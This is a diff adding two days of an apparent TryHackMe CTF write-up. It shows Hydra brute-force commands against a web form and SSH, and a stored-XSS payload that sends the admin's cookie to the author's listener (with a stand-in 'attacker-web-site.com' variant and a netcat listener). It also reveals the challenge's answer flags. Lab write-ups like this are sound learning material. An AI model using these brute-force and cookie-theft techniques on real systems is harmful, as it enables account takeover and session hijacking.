@@ -496,12 +496,109 @@ In this task we are using python to automate several tasks on some zipped files.
 
 ### [Day 17] Hydra-ha-ha-haa
 
+In this task we will be using [Hydra](https://en.kali.tools/?p=220) (can be downloaded [here](https://github.com/vanhauser-thc/thc-hydra) if needed) to brute force a password for someones web application login and SSH login. The supporting material can be found [here](https://tryhackme.com/resources/blog/hydra).
 
+With a quick Nmap scan we can see there are indeed two open ports (22 and 80).
+
+![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Nmap_Scan.png)
+
+1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
+
+   We first visit the website on the target ip and port 80 (without the port it will still redirect).
+   
+   ![Website Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Website_Login.png)
+   
+   After inspecting the page, we see the form uses the `POST` method and the fields of interest are called `username` and `password`.
+   
+   Using the documentation we can write the following hydra command to try and crack Molly's password.
+   
+   ```cmd
+   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.128 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+   ```
+   
+   - **-l** = username
+   - **-P** = password list
+   - **/login** = the page to which hydra directs the request
+   - **username & password** = the fields to enter data into
+   
+   ![Hydra Website Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_Web_Password.png)
+   
+   With the found password we can now login in to website and find the flag.
+
+   ><details><summary>Click for answer</summary>THM{2673a7dd116de68e85c48ec0b1f2612e}</details>
+
+2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+   To crack molly's ssh password we use the following command with Hydra:
+   
+   ```cmd
+   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.128 ssh -t 4
+   ```
+   
+   - **-t** = number of threads
+   
+   ![Hydra SSH Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Password.png)
+   
+   Using this password we can login to the machine through ssh with:
+   
+   ```cmd
+   ssh molly@10.10.52.128
+   ```
+   
+   ![SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Logged_In.png)
+   
+   Here we can find the flag.
+   
+   ![SSH Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2017/Hydra_SSH_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM{c8eeb0468febbadea859baeb33b2541b}</details>
 
 ### [Day 18] ELF JS
 
+In this task we will exploit an XXS vulnerability using Javasctipt to get access to the admin cookie. The supporting documentation can be found [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).
 
+1. What is the admin's authid cookie value?
 
+   After registering ourselves on the website, it is time to find out where we can use this XSS vulnerability. 
+   
+   Using the code `<script>alert(1)</script>` in the form for the message, we observe this is where the vulnerability is at. 
+   
+   ![Alert Concept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Concept.png)
+   
+   This also works for displaying our cookie for this session using: `<script>alert(document.cookie);</script>`
+   
+   ![Alert Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Cookie.png)
+   
+   Using the documentation we see that we can redirect the user to a website controlled by us which contains the cookie data within the request. `<script>window.location = ‘attacker-web-site.com/page?param=’ + document.cookie </script>`
+   
+   It also stated we should close any paragraphs. From de developer tool we can indeed see the information of the messages is placed within `<p>` tags, so we need to close those as well.
+   
+   Altering the code line we get the following:
+   
+   ```html
+   </p><script>window.location = "http://10.18.78.136:1337/mine.html?cookie="+ document.cookie;</script><p>
+   ```
+   
+   The IP address is our machine and the port is a 'randomly' chosen number. Then we need a fake page and parameter.
+   
+   No we setting a listener on our machine using `netcat` to listen to any request made on port 1337.
+   
+   ```cmd
+   nc -lvp 1337
+   ```
+   
+   - **-l** = specifies using listening mode
+   - **-v** = verbose logging
+   - **-p** = specifies port number to listen on
+
+   **Note!** This apparently works, as the admin will periodically visit the website, meaning their connection will be forwarded to our machine. This was unclear to me at first.
+
+   ![Netcat Request](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2018/ELF_JS_Netcat_Cookie.png)
+   
+   **Note!** The code we used here `window.location` actually redirects the user to our address. This effectivly renders the website useless as it is constantly redirecting traffic. This means we have to input our code correct in one try. Otherwise we have to restart the VM. It is clear this is not the perfect command as it will alert the owners, however, for now this was the best I could find by myself.
+
+   ><details><summary>Click for answer</summary>2564799a4e6689972f6d9e1c7b406f87065cbf65</details>
+   
 ### [Day 19] Commands
 
 
